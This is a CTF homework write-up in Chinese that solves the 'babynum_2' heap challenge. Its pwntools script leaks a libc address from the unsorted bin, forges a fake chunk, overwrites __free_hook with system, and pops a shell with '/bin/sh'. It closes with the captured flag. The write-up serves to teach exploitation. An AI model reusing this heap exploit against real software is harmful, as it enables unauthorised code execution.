# hw_babynum_2

1. 這題一開始我先嘗試執行程式，並看 source code  跟 用gdb 去看每個選項執行完的效果，發現這題跟 Lab_Babynote 很像，但不同的是 這邊 add() 有三個參數( index, name, password )會增加 0x10 個 byte，所以我的想法是用類似 Lab_babynote 的做法去解這題，一樣先 heap 堆疊 → leak memory information from unsorted bin → 構造 fake chunk → get shell 。但是中間的所有 offset 可能要改過。

1. 首先，先heap 堆疊，這邊我把每個選項改寫成函數，然後要執行選項的時候，就不用重複一直打很多行的 r.sendlineafter，然後下面就可以用類似 babynote 對方法去堆疊 heap。

```python
def add( index , username , password ):
    r.sendlineafter( '>' , b'1' )
    r.sendlineafter( "index\n> ", str(index).encode() )
    r.sendlineafter( "username\n> ",str(username).encode())
    r.sendlineafter( "password\n> ", str(password).encode()) 
def edit( index , size , idc_p_data_size ):
    r.sendlineafter( '>' , b'2' )
    r.sendlineafter( "index\n> ", str(index).encode())
    r.sendlineafter( 'size\n> ' , str(size).encode())
    r.send( str(idc_p_data_size).encode()) #users[idx]->data, size

def delete( index ):
    r.sendlineafter( '>' , b'3' )
    r.sendlineafter( "index\n> ", str(index).encode() )
                                                     

def show():
    r.sendlineafter( '>' , b'4' )

add(1,"A"*8,"A"*8)
edit(1,0x418,"A")
add(2,"B"*8,"B"*8)
edit(2,0x18,"B")
add(3,"C"*8,"C"*8)
delete(1)

```

3. 然後嘗試直接去 leak mamory的資訊 from unsorted bin，這邊我直接用 unsorted bin 的 fd ，會指向 main_arena+96 的地方，我用它當基準，然後用 gcb 分別去找 “p &__free_hook 和 “p &system” 的位址，然後去算它們跟 main_arena+96 之間的距離分別是 +0x2268 及 -0x19a950。

```
main_areana+96 : 0x7fb6fc918be0
free_hook : 0x7fb6fc91ae48
system : 0x7fb6fc77e290
free_hook - main_arena+96 = 0x2268
system - main_arena+96 = 0x19a950
```

```python
show()
r.recvuntil("data: ")
main_arena = u64(r.recv(6).ljust(8,b"\x00"))
free_hook = main_arena + 0x2268 
system = main_arena - 0x19a950
info(f"main_arena : {hex(main_arena)}")
print("main_arena :", main_arena)
print("free_hook",free_hook)
print("system",system)
```

1. 再來就是利用前面得到的資訊，組成一個 fake_chunk ，fake_chunk 裡面要多一行的 password ，然後再用 edit(2, 0x48, data )去蓋過 chunk 及 edit(2, 0x8, p64(system)) 將 free_hook 指向的地方改為 system 的 address，而我這邊的程式碼沒有用到前面寫好的 function 而改為一行一行寫的原因是，不知道為什麼我用前面的函數傳送字串會有問題，導致覆蓋的 offset 會出錯，所以改回去用比較一般的寫法，就可以成功覆蓋 chunk 。

```python
data = b'/bin/sh\x00'.ljust(0x10, b"B")
fake_chunk =flat(
    0, 0x31,
    b"AAAAAAAA", b"AAAAAAAA",
    b"AAAAAAAA", b"AAAAAAAA",
    free_hook,
    )

#edit(2, 0x48, data )
r.sendlineafter('>', b'2')
r.sendlineafter( "index\n> ", b'2')
r.sendlineafter( "size\n> ", b'1048')
r.send( data + fake_chunk )

#edit(2, 0x8, p64(system))
r.sendlineafter('>', b'2')
r.sendlineafter( "index\n> ", b'3')
r.sendlineafter( "size\n> ", b'8')
r.send( p64(system) )
```

![截圖 2022-12-07 下午9.54.49.png](hw_babynum_2%20bdfea95d9557435d9f75205f25a005d3/%25E6%2588%25AA%25E5%259C%2596_2022-12-07_%25E4%25B8%258B%25E5%258D%25889.54.49.png)

1. 最後，可以執行 delete(2) ，呼叫 free_hook 然後執行 system(“/bin/sh”)，就成功拿到 shell ，然後再去 cat home/chal/flag 就能夠拿到 FLAG{crocodile_9d7d8f69be2c2ab84721384d5bda877f}